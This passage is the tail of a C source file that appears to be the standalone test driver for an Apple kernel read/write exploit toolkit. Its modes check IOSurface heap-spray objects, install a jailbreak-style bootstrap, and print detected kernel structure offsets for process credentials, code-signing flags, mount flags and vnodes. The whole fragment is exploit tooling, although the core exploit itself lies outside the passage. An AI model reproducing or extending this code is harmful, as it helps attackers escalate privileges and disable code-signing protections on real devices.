        for (int i = 0; i < SPRAY_COUNT; i++) {
            if (!state.spray_surfaces[i]) continue;
            CFTypeRef val = IOSurfaceCopyValue((IOSurfaceRef)state.spray_surfaces[i], SPRAY_KEY);
            if (val) {
                printf("  Surface %d: readback OK (%ld bytes)\n", i,
                       CFDataGetLength((CFDataRef)val));
                CFRelease(val);
            }
        }
        for (int i = 0; i < SPRAY_COUNT; i++) {
            if (state.spray_surfaces[i]) CFRelease((IOSurfaceRef)state.spray_surfaces[i]);
        }

    } else if (strcmp(argv[1], "bootstrap") == 0) {
        memset(&state, 0, sizeof(state));
        state.initialized = true; /* fake for testing directory creation */
        krw_install_bootstrap(&state, "/dev/null");

    } else if (strcmp(argv[1], "offsets") == 0) {
        memset(&state, 0, sizeof(state));
        state.initialized = true;
        krw_detect_offsets(&state);
        printf("\n--- Offset Table ---\n");
        printf("proc_p_pid:     0x%x\n", state.offsets.proc_p_pid);
        printf("proc_p_next:    0x%x\n", state.offsets.proc_p_next);
        printf("proc_p_name:    0x%x\n", state.offsets.proc_p_name);
        printf("proc_p_flag:    0x%x\n", state.offsets.proc_p_flag);
        printf("proc_p_ro:      0x%x\n", state.offsets.proc_p_ro);
        printf("proc_task:      0x%x\n", state.offsets.proc_task);
        printf("proc_ro_ucred:  0x%x\n", state.offsets.proc_ro_p_ucred);
        printf("proc_ro_csflags:0x%x\n", state.offsets.proc_ro_p_csflags);
        printf("mount_mnt_flag: 0x%x\n", state.offsets.mount_mnt_flag);
        printf("vnode_v_mount:  0x%x\n", state.offsets.vnode_v_mount);
        printf("vnode_v_name:   0x%x\n", state.offsets.vnode_v_name);

    } else {
        printf("Unknown mode: %s\n", argv[1]);
        return 1;
    }

    return 0;
}
#endif /* KRW_STANDALONE */
